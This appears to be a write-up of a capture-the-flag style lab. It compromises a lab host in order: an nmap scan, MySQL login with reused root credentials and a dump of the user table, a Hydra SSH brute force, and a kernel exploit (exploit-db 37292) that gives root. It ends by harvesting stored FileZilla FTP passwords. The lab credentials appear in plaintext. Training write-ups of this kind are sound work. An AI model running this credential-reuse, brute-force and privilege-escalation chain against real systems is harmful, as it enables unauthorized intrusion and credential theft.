## NMAP

```
nmap -sCV -p- -A -T4 10.10.110.10
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 08:35 PDT
Nmap scan report for 10.10.110.10
Host is up (0.076s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b3299b8297012b5f6e4191f8439ee785 (DSA)
|   2048 1316c334ff04546a1f5d469d5b44a988 (RSA)
|_  256 90ba2ce7d53135ddd0c91911d5a7a09c (ECDSA)
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 104
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, LongColumnFlag, FoundRows, InteractiveClient, Speaks41ProtocolNew, Support41Auth, LongPassword, Speaks41ProtocolOld, SupportsTransactions, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, ODBCClient, SupportsCompression, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: v1,))0VB(AK9wpMkVN`y
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.30 seconds
```

Using the credentials we found from ares.htb

## MySQL
```
 mysql -u root -psbtR5t7cq7PWE3AJ -h 10.10.110.10
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 113
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```
```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| users              |
+--------------------+
4 rows in set (0.125 sec)

MySQL [(none)]> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [users]> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| credentials     |
+-----------------+
1 row in set (0.077 sec)

MySQL [users]> show columns from credentials;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| name     | varchar(20) | YES  |     | NULL    |       |
| password | varchar(20) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
2 rows in set (0.077 sec)

MySQL [users]> select * from credentials;
+-----------+--------------------+
| name      | password           |
+-----------+--------------------+
| mrb3n     | offshorerox!       |
| egre55    | HADES_FTW123       |
| MinatoTW  | Breakpoint_P41N    |
| soti      | ThinkOUTSIDEtheBOX |
| g0blin    | Holiday666         |
| Mr_R3b00t | BURP_GOES_BRRRR!!  |
+-----------+--------------------+
6 rows in set (0.076 sec)

MySQL [users]> Ctrl-C -- exit!
Aborted
```
Lets run this list against hydra

## Hydra
```
hydra -L users.txt -P passwords.txt 10.10.110.10 ssh -v -t 64

```
```
[22][ssh] host: 10.10.110.10   login: soti   password: ThinkOUTSIDEtheBOX
```
## SSH
```
ssh soti@10.10.110.10
The authenticity of host '10.10.110.10 (10.10.110.10)' can't be established.
ECDSA key fingerprint is SHA256:lrQib72+g9RFbL/l6a1NZLf15aM0ebjCKdPUoLWvrzg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.110.10' (ECDSA) to the list of known hosts.
soti@10.10.110.10's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-54-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
soti@SQL02-Hephaestus:~$ 
```
## linpeas
```
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 3.13.0-54-generic (buildd@allspice) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #91-Ubuntu SMP Tue May 26 19:15:08 UTC 2015
User & Groups: uid=1000(soti) gid=1000(soti) groups=1000(soti),24(cdrom),30(dip),46(plugdev),109(lpadmin),124(sambashare)
Hostname: SQL02-Hephaestus
Writable folder: /run/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 3.13.0-54-generic (buildd@allspice) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #91-Ubuntu SMP Tue May 26 19:15:08 UTC 2015
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.6 LTS
Release:	14.04
Codename:	trusty

```
Exploit

https://www.exploit-db.com/exploits/37292

```
soti@SQL02-Hephaestus:/tmp$ nano ofs.c
soti@SQL02-Hephaestus:/tmp$ gcc ofs.c -o ofs
soti@SQL02-Hephaestus:/tmp$ ./ofs 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
```
## Further Enumeration

I saw that filezilla was running on a few profiles

```
root@SQL02-Hephaestus:/home/fred/.filezilla# cat sitemanager.xml 
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <Servers>
        <Server>
            <Host>10.10.110.12</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>fred</User>
            <Pass>fr3dS_Str0ng_p@ss</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
            <Name>FTP01</Name>
            <Comments></Comments>
            <LocalDir></LocalDir>
            <RemoteDir></RemoteDir>
            <SyncBrowsing>0</SyncBrowsing>FTP01
        </Server>
    </Servers>
</FileZilla3>
```

















